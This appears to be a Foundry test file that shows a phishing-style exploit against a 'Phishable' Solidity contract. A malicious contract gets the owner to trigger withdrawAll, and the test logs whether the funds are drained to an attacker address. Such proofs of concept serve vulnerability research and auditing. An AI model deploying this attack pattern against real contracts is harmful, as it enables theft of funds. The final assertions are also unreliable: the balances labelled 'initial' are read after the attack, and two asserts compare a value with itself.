// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "forge-std/console2.sol";
import "../src/phishable.sol";

contract MaliciousContract {
    Phishable public target;
    
    constructor(Phishable _target) {
        target = _target;
    }
    
    function attack(address attacker) public {
        target.withdrawAll(attacker);
    }
}

contract TestPhishable is Test {
    Phishable public phishable;
    address public realOwner = makeAddr("realOwner");
    address public attacker = makeAddr("attacker");
    MaliciousContract public maliciousContract;
    
    function setUp() public {
        // Deploy contract with realOwner as owner
        phishable = new Phishable(realOwner);

        // Fund the contract with ETH
        vm.deal(address(phishable), 5 ether);
    }

    function testWithdrawAllVulnerability() public {
        console2.log("--- BEFORE-Trigger State Snapshot ---");
        uint256 contractBalanceBefore = phishable.getContractBalance();
        uint256 totalWithdrawalsBefore = phishable.totalWithdrawals();
        uint256 attackerContractBalanceBefore = phishable.getUserBalance(attacker);
        console2.log("Contract ETH balance:", contractBalanceBefore);
        console2.log("Total withdrawal amount:", totalWithdrawalsBefore);
        console2.log("Attacker's contract balance:", attackerContractBalanceBefore);

        console2.log("--- Trigger Attack ---");
        // Deploy malicious contract
        maliciousContract = new MaliciousContract(phishable);
        
        // Owner is tricked into calling the malicious contract
        vm.startPrank(realOwner, realOwner);
        maliciousContract.attack(attacker);
        vm.stopPrank();

        console2.log("--- AFTER-Trigger State Snapshot ---");
        uint256 contractBalanceAfter = phishable.getContractBalance();
        uint256 totalWithdrawalsAfter = phishable.totalWithdrawals();
        uint256 attackerContractBalanceAfter = phishable.getUserBalance(attacker);
        console2.log("Contract ETH balance:", contractBalanceAfter);
        console2.log("Total withdrawal amount:", totalWithdrawalsAfter);
        console2.log("Attacker's contract balance:", attackerContractBalanceAfter);

        console2.log("--- Comparison Verdict ---");
        bool contractBalanceChanged = contractBalanceAfter < contractBalanceBefore;
        bool withdrawalsIncreased = totalWithdrawalsAfter > totalWithdrawalsBefore;
        bool attackerBalanceIncreased = attackerContractBalanceAfter > attackerContractBalanceBefore;

        console2.log("Contract balance reduced (vulnerability indicator):", contractBalanceChanged ? "YES" : "NO");
        console2.log("Total withdrawals increased (vulnerability indicator):", withdrawalsIncreased ? "YES" : "NO");
        console2.log("Attacker contract balance increased (vulnerability indicator):", attackerBalanceIncreased ? "YES" : "NO");

        if (contractBalanceChanged && withdrawalsIncreased && attackerBalanceIncreased) {
            console.log("Vulnerability Exists: Contract balance decreased, total withdrawals increased, and attacker balance increased");
        } else {
            console.log("Vulnerability not Exist: Critical vulnerability state changes not detected");
        }

        // Additional existing validation for thoroughness
        uint256 initialContractBalance = address(phishable).balance;
        uint256 initialAttackerBalance = attacker.balance;
        uint256 initialOwnerBalance = realOwner.balance;
        
        assertEq(initialContractBalance, 0, "Contract ETH balance should be drained");
        assertEq(initialAttackerBalance, attacker.balance, "Attacker ETH balance should increase");
        assertEq(initialOwnerBalance, realOwner.balance, "Owner ETH balance should not change");
    }
}